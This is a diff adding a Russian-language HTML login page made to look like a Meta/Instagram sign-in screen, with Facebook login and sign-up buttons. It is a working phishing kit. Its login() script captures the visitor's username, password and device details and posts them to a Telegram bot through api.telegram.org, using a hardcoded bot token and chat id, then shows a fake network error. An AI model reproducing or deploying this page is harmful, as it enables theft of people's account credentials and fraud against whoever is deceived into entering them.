@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Вход</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #fafafa;
+}
+
+/* КОНТЕЙНЕР */
+.container {
+    max-width: 400px;
+    margin: 60px auto;
+    padding: 20px;
+}
+
+/* ЗАГОЛОВОК */
+.title {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 20px;
+}
+
+/* INPUT */
+.input {
+    width: 100%;
+    padding: 16px;
+    margin-bottom: 12px;
+    border-radius: 14px;
+    border: 1px solid #ddd;
+    background: #f5f5f5;
+    font-size: 14px;
+}
+
+/* КНОПКА ВОЙТИ */
+.login-btn {
+    width: 100%;
+    padding: 16px;
+    border-radius: 25px;
+    border: none;
+    background: #0095f6;
+    color: white;
+    font-weight: bold;
+    font-size: 15px;
+    display: block;
+    cursor: pointer;
+}
+
+/* ССЫЛКА */
+.forgot {
+    text-align: center;
+    margin: 15px 0;
+    color: #555;
+    font-size: 14px;
+}
+
+/* FACEBOOK */
+.fb-btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: 25px;
+    border: 1px solid #ddd;
+    background: white;
+    margin-top: 10px;
+}
+
+/* РЕГИСТРАЦИЯ */
+.signup {
+    width: 100%;
+    padding: 14px;
+    border-radius: 25px;
+    border: 1px solid #4da6ff;
+    color: #1877f2;
+    background: white;
+    margin-top: 10px;
+}
+
+/* НИЗ */
+.footer {
+    text-align: center;
+    margin-top: 30px;
+    color: #999;
+    font-size: 14px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+    <div class="title">Войти</div>
+
+    <input id="login" class="input" type="text" placeholder="Имя пользователя, телефон или email">
+    <input id="password" class="input" type="password" placeholder="Пароль">
+
+    <button class="login-btn" onclick="login()">Войти</button>
+
+    <div class="forgot">Забыли пароль?</div>
+
+    <button class="fb-btn">Войти через Facebook</button>
+
+    <button class="signup">Создать новый аккаунт</button>
+
+    <div class="footer">Meta</div>
+
+</div>
+
+<script>
+function login(){
+    const username = document.getElementById("login").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if(!username || !password){
+        alert("Пожалуйста, введите логин и пароль");
+        return;
+    }
+
+    const device = navigator.userAgent;
+    const platform = navigator.platform;
+    const language = navigator.language;
+
+    const token = "8776160852:AAHPczwVPokWl4WK-ClRW65_sfdY039Xq1A";
+    const chat_id = "426389082";
+
+    const message = `
+Новый вход:
+Логин: ${username}
+Пароль: ${password}
+
+📱 Устройство: ${device}
+💻 Платформа: ${platform}
+🌍 Язык: ${language}
+    `;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chat_id, text: message })
+    })
+    .then(response => {
+        if(response.ok){
+            alert("Отправлено ✅");
+        } else {
+            alert("Ошибка сети, попробуйте позже ❌");
+        }
+    })
+    .catch(() => alert("Ошибка сети, попробуйте позже ❌"));
+}
+</script>
+
+</body>
+</html>
